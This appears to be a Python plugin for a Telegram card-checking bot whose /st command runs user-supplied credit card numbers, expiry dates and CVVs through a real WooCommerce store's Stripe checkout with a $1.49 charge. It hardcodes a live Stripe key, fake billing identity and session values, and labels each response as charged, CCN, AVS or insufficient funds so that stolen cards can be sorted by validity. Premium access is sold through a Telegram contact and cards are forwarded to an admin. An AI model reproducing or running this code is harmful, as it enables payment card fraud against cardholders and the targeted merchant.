"""
Stripe Follovery Gateway Plugin
Commands: /st, .st, !st, $st
Charge: $1.49
"""

import requests
import re
import json
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append('..')
from utils.card_utils import extract_card_info
from utils.bin_lookup import get_bin_info
from utils.response_formatter import get_response_keyboard
from utils.gateway_middleware import validate_card_with_luhn

# Plugin metadata
PLUGIN_INFO = {
    'name': 'Stripe Follovery',
    'commands': ['st'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Stripe payment gateway (Follovery) - $1.49 charge',
    'type': 'charge',
    'status': 'active'
}

def categorize_stripe_response(checkout_response):
    """Categorize Stripe response"""
    try:
        data = checkout_response.json()
        content = str(data).lower()
        message_text = ""
        
        # Try to extract message
        if 'messages' in data:
            messages = data['messages']
            pattern = r'<li>\s*(.*?)\s*</li>'
            match = re.search(pattern, messages, re.DOTALL)
            if match:
                message_text = match.group(1).strip().lower()
        
        # Check for success
        if data.get('result') == 'success':
            if 'wc_stripe_verify_intent' in content:
                return '3ds', "3DS Required", " - 3DS REQUIRED"
            else:
                return 'charged', "Payment Successful - Order Placed", " - ORDER PLACED 💎"
        
        # Check for CVV/CVC
        ccn_keywords = ['cvc', 'cvv', 'security code']
        for keyword in ccn_keywords:
            if keyword in message_text or keyword in content:
                return 'approved', message_text or "CVV Mismatch", " - CCN"
        
        # Check for AVS
        avs_keywords = ['avs', 'billing', 'zip', 'address', 'postal code']
        for keyword in avs_keywords:
            if keyword in message_text or keyword in content:
                return 'approved', message_text or "AVS Failure", " - AVS FAILURE"
        
        # Check for other approved keywords
        other_approved_keywords = ['insufficient', 'funds', 'money']
        for keyword in other_approved_keywords:
            if keyword in message_text or keyword in content:
                return 'approved', message_text or "Insufficient Funds", ""
        
        return 'declined', message_text or "Payment Declined", ""
    except:
        return 'declined', "Payment Declined", ""

def get_status_emoji(category):
    """Get emoji for status category"""
    emoji_map = {
        'charged': 'Charged 🔥',
        'approved': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅',
        '3ds': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎',
        'declined': '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌'
    }
    return emoji_map.get(category, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')

def format_stripe_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format Stripe response for Telegram"""
    card, month, year, cvv = card_info
    cc_display = f"`{card}|{month}|{year}|{cvv}`"
    
    status_text = get_status_emoji(category)
    
    response_text = f"{status_text}\n\n"
    response_text += f"㊕ 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1.49\n"
    response_text += f"㊕ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}{suffix}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"㊕ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"㊕ 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"㊕ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"㊕ 𝗧𝗼𝗼𝗸 {execution_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

class StripeFolloveryGateway:
    def __init__(self):
        self.session = requests.Session()
        self.base_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'Upgrade-Insecure-Requests': "1",
            'Accept-Language': "en-GB,en-US;q=0.9,en;q=0.8"
        }
    
    def add_to_cart(self):
        """Add item to cart"""
        url = "https://follovery.net/product/custom-face-mask/"
        
        payload = {
            'add-to-cart': '12',
            'fpd_product': '{"product":[{"title":"Front","thumbnail":"https://follovery.net/wp-content/uploads/2020/05/background.png","elements":[{"title":"Top","source":"https://follovery.net/wp-content/uploads/2020/05/Top.png","parameters":{"advancedEditing":false,"angle":0,"autoCenter":false,"autoSelect":false,"boundingBox":"","boundingBoxMode":"clipping","colorLinkGroup":false,"colorPrices":{},"colors":"","copyable":false,"cornerSize":24,"draggable":false,"evented":false,"excludeFromExport":false,"fill":false,"filter":null,"fixed":false,"flipX":false,"flipY":false,"height":1000,"left":500,"lockUniScaling":true,"locked":true,"minScaleLimit":0.01,"objectCaching":false,"opacity":1,"originParams":{"objectCaching":false,"z":0,"price":0,"colors":"","removable":false,"draggable":false,"rotatable":false,"resizable":false,"copyable":false,"zChangeable":false,"boundingBox":"","boundingBoxMode":"clipping","autoCenter":false,"replace":"","replaceInAllViews":false,"autoSelect":false,"topped":true,"colorPrices":{},"colorLinkGroup":false,"patterns":"","sku":"","excludeFromExport":false,"showInColorSelection":false,"locked":true,"uniScalingUnlockable":false,"fixed":false,"originX":"center","originY":"center","cornerSize":24,"fill":false,"lockUniScaling":true,"pattern":false,"top":300,"left":500,"angle":0,"flipX":false,"flipY":false,"opacity":1,"scaleX":1,"scaleY":1,"uploadZone":false,"filter":null,"scaleMode":"fit","resizeToW":"0","resizeToH":"0","advancedEditing":false,"uploadZoneMovable":false,"uploadZoneRemovable":false,"padding":0,"minScaleLimit":0.01,"customAdds":[],"_isInitial":true,"source":"https://follovery.net/wp-content/uploads/2020/05/Top.png","title":"Top","id":"1770738820358","cornerColor":"#f5f5f5","cornerIconColor":"#000000","selectable":false,"lockRotation":true,"hasRotatingPoint":false,"lockScalingX":true,"lockScalingY":true,"lockMovementX":true,"lockMovementY":true,"hasControls":false,"evented":false,"lockScalingFlip":true,"crossOrigin":""},"originX":"center","originY":"center","padding":0,"pattern":false,"patterns":"","price":0,"removable":false,"replace":"","replaceInAllViews":false,"resizable":false,"resizeToH":"0","resizeToW":"0","rotatable":false,"scaleMode":"fit","scaleX":1,"scaleY":1,"showInColorSelection":false,"sku":"","top":300,"topped":true,"uniScalingUnlockable":false,"uploadZone":false,"uploadZoneMovable":false,"uploadZoneRemovable":false,"width":1000,"z":-1,"zChangeable":false,"topLeftX":0,"topLeftY":-200},"type":"image"}],"options":{"stageWidth":1000,"stageHeight":600,"customAdds":{"designs":true,"uploads":true,"texts":true,"drawing":true},"customImageParameters":{"minW":100,"minH":100,"maxW":10000,"maxH":10000,"minDPI":72,"maxSize":10,"left":0,"top":0,"z":-1,"minScaleLimit":0.01,"price":9,"replaceInAllViews":false,"autoCenter":true,"draggable":true,"rotatable":true,"resizable":true,"zChangeable":true,"autoSelect":false,"topped":false,"uniScalingUnlockable":false,"boundingBoxMode":"clipping","scaleMode":"fit","removable":true,"resizeToW":"0","resizeToH":"0","advancedEditing":false},"customTextParameters":{"left":0,"top":0,"z":-1,"price":0,"autoCenter":true,"draggable":true,"rotatable":true,"resizable":true,"zChangeable":true,"autoSelect":false,"topped":false,"uniScalingUnlockable":false,"curvable":true,"curveSpacing":10,"curveRadius":80,"curveReverse":false,"boundingBoxMode":"clipping","fontSize":18,"minFontSize":1,"maxFontSize":1000,"widthFontSize":0,"maxLength":0,"maxLines":0,"textAlign":"left","removable":true},"maxPrice":-1,"optionalView":false,"designCategories":[],"printingBox":{},"layouts":[],"usePrintingBoxAsBounding":false},"names_numbers":null,"mask":null,"locked":false,"productTitle":"Face Mask"}],"usedFonts":[],"usedColors":[],"usedDepositPhotos":[]}',
            'fpd_remove_cart_item': '',
            'fpd_print_order': '',
            'fpd_product_price': '1.49',
            'fpd_product_thumbnail': 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAA8CAYAAACQPx/OAAAAAXNSR0IArs4c6QAADtxJREFUeF7lnMtvVNcdgM8AfoAD1FBoSgKEEEhqZxQCVGmUpmlRFoENjaW2m1B1VaSu+j9UbKIsW6mKuqgUCUWtIqWrVmJRFFmmQqmCBSWT8DTvZ8A8zMOPqb7j+zm/3rqJF/WMxVzp6M7cx7kzv+/8nufeW6nX6/XUhOXu3bvp9u3bad68ealSqeRfwE8ZGxtLo6OjU43vExMTed90C+fGRn+0+fPn57ZgwYK8bmtr+69rjY+P5+vZP9egrVixInV1dTVBKilVmgXkwoULWVAKk3+PYATy8OHDDEWBsc9FgHz/KiDAoAHDz55LfwCx8d1rAGXdunWtBeTixYt5xNJcBAIMG0AQmhpShsG5ahn7/Bw1o729fQpKGYjAuYZAWD/99NOtB0QNiUDQCmA8ePAgr8smJWpU1A61hT4FDRRhsOa7A0ANEbhANFstBeTKlSt51EcNQRAICSD379//Dw2J5krBl83V/wKCuapo7yIQzVZLAbly5Uoe9VFDEARCAgi+hM9R6JooR7fbit1ZQ4DBmu9qEOfoV9CK2DiOcwHBZwMA0dQZfkeT1VJA9CERCEDwH7T79+9nMwYQNTNqgQIXmmYpahNACASiDwEIGqHZ4ljgCNoZRmE4oHyfDYjX5Nxnnsn3BDR8aYoPKQMRBkBYgMHoLi8SfJQ4WwVxrBNKZSCYrDJ8gJg8CkQIAp/qf3x8qpkD4cOi1P7GxsZuT0xMrEop8R2mR5gAFy5cqH9V+/rIuvy/4z7gYD6Ag/C5CP/jP+0A8LMmSlhqjOeiQdQn8rWWLl3anEywXi/V0pu0q1erpSNHjrBWSyIPjY3AxBRN92OKzEBvSsvmDag0J1yiNnH8+Ph4/n1mCHznuPLcN/tpnLtw4cK0evXqjMQ+Zs2HzAkNViuLkeu2CII/Vn5NE6M3jub86iacu4I3G4+Ac5+8RgJD2mWYfOc3qVV+53/OFSD5x8/m0ohBxT/7b9dk5EaBa8oEo3BFwJ9H4JgXZ/AEEx+U0fQxCBA2L7/hnJh9I3QfA0RzOOZR1ZCvAuOo1VxFwT/33HPp2WefzZ81WfahKUNwfGaJWsVn+0NL0BaFz7EI18+8AY7f0HRAxduh2SdQ3q+x6p/V0v4J2i9+8Yu0d+/e9OGHH6aPP/44ffLJJ+lf//pXbu+//3764IMPMiT2sWbNPs+hD/q+evVq7pvQF21yLSi2ESgwnKMn2aCvyYOfoXaj0fqy6EeiBrDv+eefTy+//HKGwH7OnZxin4ShGVNrNHV+Ny/hjdhsi9v4/LOf/Sz9+Mc/nnrWqOFM8j36f++uPyS/p6Vez8+gZ2EdPHgw70NIHGeF3O+8dRoo165dm3rdG8JX6O+//3766U9/mj788MN0+PDh3I9vk6b/F154IX388ce/HBwc/NOePXuaHDi1TGIoCAtniX2m1R999FFuH330Udq/f/+UUHk3IaAAwmf22/75z3+mf//73+nf//53GhwczGBef/31qXdoAWPjxo25nx07drx6+PDhn/b39//nlVdeaYLZanEN0X4zyjEtZ8+eTWOT7/p67733ssCNvDQ15hX8H2F+93/+85/83//+N7339//tp/z/+///+0/605/+lP6+99709O+//33+71/+lH6z//73v+Xv/6///ve/6U9/+lv+29/e/vbf+z//+1/+21//+tc/vvHGG+lvf/tb+uPv/pj/h/c+L/hb+uMf//j7wcHB3+3Zs+fff/3rX7eW==',
            'quantity': '1'
        }
        
        headers = self.base_headers.copy()
        headers.update({
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Cache-Control': "max-age=0",
            'Origin': "https://follovery.net",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://follovery.net/product/custom-face-mask/"
        })
        
        try:
            response = self.session.post(url, data=payload, headers=headers, allow_redirects=False, timeout=30)
            
            if response.status_code == 302:
                cart_url = response.headers['Location']
                cart_response = self.session.get(cart_url, headers=headers, allow_redirects=True)
                return cart_response.status_code == 200
            
            return False
        except:
            return False
    
    def get_checkout_nonce(self):
        """Get WooCommerce checkout nonce"""
        url = "https://follovery.net/checkout/"
        
        headers = self.base_headers.copy()
        headers.update({
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://follovery.net/cart/"
        })
        
        try:
            response = self.session.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                pattern = r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]+)"'
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None
    
    def create_stripe_payment_method(self, card, month, year, cvv):
        """Create Stripe payment method"""
        url = "https://api.stripe.com/v1/payment_methods"
        
        # Ensure year is 4 digits
        if len(year) == 2:
            year = '20' + year
        
        payload = {
            'type': "card",
            'billing_details[name]': "Tete Kala",
            'billing_details[address][line1]': "New York Bakery Co Ltd",
            'billing_details[address][line2]': "Unit 1-2St. Laurence Avenue Twenty Twenty Industrial Estate Allington",
            'billing_details[address][city]': "Maidstone",
            'billing_details[address][postal_code]': "ME16 0LL",
            'billing_details[address][country]': "GB",
            'billing_details[email]': "amkush06658@gmail.com",
            'billing_details[phone]': "01253652525",
            'card[number]': card,
            'card[cvc]': cvv,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'guid': "14ff65e8-e107-4dee-9b9e-8211795b1eb859960e",
            'muid': "c28dd784-c12a-4ca2-820c-fcb40f5f23055faeff",
            'sid': "7bbebff6-c2d6-4097-9a2a-0a8298c6d267d0cc9d",
            'payment_user_agent': "stripe.js/e3084017e7; stripe-js-v3/e3084017e7; card-element",
            'referrer': "https://follovery.net",
            'time_on_page': "61715",
            'client_attribution_metadata[client_session_id]': "bfae8260-655a-470a-9d00-aafa3a9bfe26",
            'client_attribution_metadata[merchant_integration_source]': "elements",
            'client_attribution_metadata[merchant_integration_subtype]': "card-element",
            'client_attribution_metadata[merchant_integration_version]': "2017",
            'key': "pk_live_xHPYiDPVVFb6I9qV8dUyxUvZ00WAfN6fFs"
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8"
        }
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=30)
            
            if response.status_code == 200:
                try:
                    payment_data = response.json()
                    if 'id' in payment_data:
                        return payment_data['id'], None
                except:
                    pass
            
            if response.status_code in [400, 402]:
                try:
                    error_data = response.json()
                    if 'error' in error_data and 'message' in error_data['error']:
                        return None, error_data['error']['message']
                except:
                    pass
            
            return None, "Failed to create payment method"
        except Exception as e:
            return None, f"Error: {str(e)}"
    
    def process_checkout(self, nonce, payment_method_id):
        """Process WooCommerce checkout"""
        url = "https://follovery.net?wc-ajax=checkout&elementor_page_id=761"
        
        payload = {
            'wc_order_attribution_source_type': "typein",
            'wc_order_attribution_referrer': "(none)",
            'wc_order_attribution_utm_campaign': "(none)",
            'wc_order_attribution_utm_source': "(direct)",
            'wc_order_attribution_utm_medium': "(none)",
            'wc_order_attribution_utm_content': "(none)",
            'wc_order_attribution_utm_id': "(none)",
            'wc_order_attribution_utm_term': "(none)",
            'wc_order_attribution_utm_source_platform': "(none)",
            'wc_order_attribution_utm_creative_format': "(none)",
            'wc_order_attribution_utm_marketing_tactic': "(none)",
            'wc_order_attribution_session_entry': "http://follovery.net/",
            'wc_order_attribution_session_start_time': "2026-02-10 15:53:07",
            'wc_order_attribution_session_pages': "4",
            'wc_order_attribution_session_count': "1",
            'wc_order_attribution_user_agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'billing_first_name': "Tete",
            'billing_last_name': "Kala",
            'billing_company': "",
            'billing_country': "GB",
            'billing_address_1': "New York Bakery Co Ltd",
            'billing_address_2': "Unit 1-2St. Laurence Avenue Twenty Twenty Industrial Estate Allington",
            'billing_city': "Maidstone",
            'billing_state': "",
            'billing_postcode': "ME16 0LL",
            'billing_phone': "01253652525",
            'billing_email': "amkush06658@gmail.com",
            'shipping_first_name': "",
            'shipping_last_name': "",
            'shipping_company': "",
            'shipping_country': "US",
            'shipping_address_1': "",
            'shipping_address_2': "",
            'shipping_city': "",
            'shipping_state': "FL",
            'shipping_postcode': "",
            'order_comments': "",
            'shipping_method[0]': "free_shipping:1",
            'payment_method': "stripe",
            'woocommerce-process-checkout-nonce': nonce,
            '_wp_http_referer': "/?wc-ajax=update_order_review&elementor_page_id=761",
            'stripe_source': payment_method_id
        }
        
        headers = self.base_headers.copy()
        headers.update({
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'X-Requested-With': "XMLHttpRequest",
            'Origin': "https://follovery.net",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://follovery.net/checkout/"
        })
        
        try:
            response = self.session.post(url, data=payload, headers=headers, timeout=30)
            return response
        except Exception as e:
            return None
    
    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Stripe Follovery"""
        start_time = time.time()
        
        try:
            # Step 1: Add to cart
            if not self.add_to_cart():
                return None, "Failed to add to cart", time.time() - start_time
            
            # Step 2: Get checkout nonce
            nonce = self.get_checkout_nonce()
            if not nonce:
                return None, "Failed to get checkout nonce", time.time() - start_time
            
            # Step 3: Create Stripe payment method
            payment_method_id, error = self.create_stripe_payment_method(card, month, year, cvv)
            
            if error:
                return None, error, time.time() - start_time
            
            # Step 4: Process checkout
            checkout_response = self.process_checkout(nonce, payment_method_id)
            
            if not checkout_response:
                return None, "Failed to process checkout", time.time() - start_time
            
            execution_time = time.time() - start_time
            return checkout_response, None, execution_time
            
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["st"], prefixes=[".", "/", "!", "$"]))
    async def st_command(client, message):
        """Handle /st command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'st')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝙎𝙩𝙧𝙞𝙥𝙚 - CHARGE

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Stripe $1.49

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /st cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        if not await validate_card_with_luhn(card_info, "Stripe $1.49", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'st')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card
        gateway = StripeFolloveryGateway()
        checkout_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'st')
        
        # Get BIN info
        bin_info = get_bin_info(card)
        
        if error:
            # Error occurred
            response_text = format_stripe_response(
                card_info=(card, month, year, cvv),
                response_message=error,
                suffix="",
                bin_info=bin_info,
                execution_time=execution_time,
                category='declined'
            )
        else:
            # Parse response
            category, response_message, suffix = categorize_stripe_response(checkout_response)
            
            response_text = format_stripe_response(
                card_info=(card, month, year, cvv),
                response_message=response_message,
                suffix=suffix,
                bin_info=bin_info,
                execution_time=execution_time,
                category=category
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ Stripe Follovery gateway commands registered")
